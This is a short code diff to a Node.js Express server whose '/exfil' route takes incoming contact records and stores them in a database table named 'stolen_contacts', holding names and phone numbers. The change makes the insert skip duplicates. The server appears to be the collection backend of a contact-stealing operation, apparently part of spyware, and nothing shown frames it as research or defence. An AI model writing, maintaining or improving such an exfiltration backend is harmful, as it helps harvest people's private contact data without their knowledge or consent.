@@ -58,7 +58,7 @@ app.post('/exfil', (req, res) => {
     }
 
     // Mapping fields
-    const sql = "INSERT INTO stolen_contacts (contact_id, first_name, last_name, phone_number) VALUES ?";
+    const sql = "INSERT IGNORE INTO stolen_contacts (contact_id, first_name, last_name, phone_number) VALUES ?";
     const values = contacts.map(c => [c.id, c.firstName, c.lastName, c.phone]);
 
     connection.query(sql, [values], (err, results) => {
@@ -133,4 +133,5 @@ process.on('SIGINT', () => {
   process.exit();
 
 });
+
 
